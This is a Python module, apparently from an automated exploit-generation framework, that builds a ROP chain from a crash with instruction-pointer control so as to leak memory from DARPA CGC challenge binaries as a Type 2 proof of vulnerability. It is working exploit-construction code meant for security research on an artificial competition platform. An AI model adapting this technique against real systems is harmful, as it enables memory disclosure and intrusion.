import angrop
import logging
import claripy
from rex import Vulnerability
from rex.exploit import CannotExploit
from rex.exploit.cgc import CGCType2RopExploit
from ..technique import Technique

l = logging.getLogger("rex.exploit.techniques.rop_leak_memory")

class RopLeakMemory(Technique):
    '''
    Very CGC specific leaking technique
    '''

    name = "rop_leak_memory"

    applicable_to = ['cgc']

    # this technique should create an exploit which is a type2 pov
    pov_type = 2

    def apply(self, **kwargs):

        ct  = self.crash.crash_type
        if not (ct == Vulnerability.IP_OVERWRITE or ct == Vulnerability.PARTIAL_IP_OVERWRITE):
            raise CannotExploit("[%s] cannot control ip", self.name)


        state = self.crash.state
        need_control = ['eax', 'ebx', 'ecx', 'edx', 'esi']
        rop_uncontrolled = [ ]
        # any one of these we can't control with rop?
        for register in need_control:
            try:
                self.rop.set_regs(**{register: 0x41414141})
            except angrop.errors.RopException:
                l.debug("unable to set register %s with rop in leaker", register)
                rop_uncontrolled.append(register)

        # for those registers which are uncontrolled by rop, can we control it circumstantially?
        # XXX special circumstances for each register
        constraints = [ ]
        for register in rop_uncontrolled:
            # if it's eax we can't control with rop, make sure it can be 2
            if register == "eax":
                constraints.append(state.regs.eax == 2)
            # if it's ebx we need to make sure it can stdout
            if register == "ebx":
                constraints.append(state.regs.ebx == 1)
            # if it's ecx we need to make sure it's practically unconstrained
            if register == "ecx":
                # TODO worry about ecx, it may be completely controllable circumstantially
                l.warning("cannot control ecx with rop when generating leaker")
                raise CannotExploit("unable to control ecx with rop, will not be able to leak a controlled address")
            # if it's edx, we need to be able to set it to 0x1000 bytes
            if register == "edx":
                constraints.append(state.regs.edx == 0x1000)
            # if it's esi, we need to point to NULL or a writable page
            # TODO support setting to a writable page
            if register == "esi":
                constraints.append(state.regs.esi == 0x0)

        if not state.satisfiable(extra_constraints=constraints):
            raise CannotExploit("circumstantial constraints generated were unsatisfactory for a rop leaker")

        addr_var = claripy.BVS('addr_var', self.crash.project.arch.bits)
        size_var = claripy.BVS('size_var', self.crash.project.arch.bits)
        chain = self.rop.do_syscall(2, [1, addr_var, size_var, 0x0], ignore_registers=rop_uncontrolled)

        chain, chain_addr = self._ip_overwrite_with_chain(chain)

        return CGCType2RopExploit(self.crash, chain_addr, chain, addr_var, size_var)
